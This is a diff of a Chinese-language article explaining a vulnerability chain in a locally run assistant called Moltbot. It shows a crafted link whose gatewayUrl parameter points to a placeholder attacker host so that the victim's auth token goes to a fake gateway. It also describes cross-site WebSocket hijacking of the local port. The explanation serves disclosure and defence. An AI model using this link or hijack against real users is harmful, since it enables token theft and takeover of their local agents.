@@ -25,7 +25,13 @@ Hacker News 上有個帖子最近炸了，135 分加 59 條留言。一個叫 de
 3. **連線時會帶上 auth token**  
    WebSocket 連線的 handshake 會自動帶上你的認證 token。這是標準做法，不然 gateway 怎麼知道你是誰？
 
-現在把這三個「合理設計」串起來：攻擊者丟給你一個連結 `http://你的moltbot.com?gatewayUrl=ws://攻擊者.com:8080`，你一點開，應用就會自動連到攻擊者的假 gateway，然後把你的 auth token 拱手送出去。
+現在把這三個「合理設計」串起來：攻擊者丟給你一個連結像這樣：
+
+```text
+example.invalid/?gatewayUrl=ws://attacker.example:8080
+```
+
+你一點開，應用就會自動連到攻擊者的假 gateway，然後把你的 auth token 拱手送出去。
 
 這還只是第一步。
 
@@ -33,7 +39,13 @@ Hacker News 上有個帖子最近炸了，135 分加 59 條留言。一個叫 de
 
 大部分人的 Moltbot 跑在 localhost 上，理論上外部網路碰不到。但攻擊者找到了另一個問題：**Moltbot 的 WebSocket server 不驗證 Origin header**。
 
-這意味著你只要訪問攻擊者的網站 `attacker.com`，他就能在你的瀏覽器裡跑 JavaScript，開一個 WebSocket 連到 `ws://localhost:18789`，然後拿偷來的 token 登入你的本地 Moltbot。
+這意味著你只要訪問攻擊者的網站 `attacker.com`，他就能在你的瀏覽器裡跑 JavaScript，開一個 WebSocket 連到：
+
+```text
+ws://localhost:18789
+```
+
+然後拿偷來的 token 登入你的本地 Moltbot。
 
 這叫 Cross-Site WebSocket Hijacking (CSWSH)。不是什麼新招，但很有效。
 
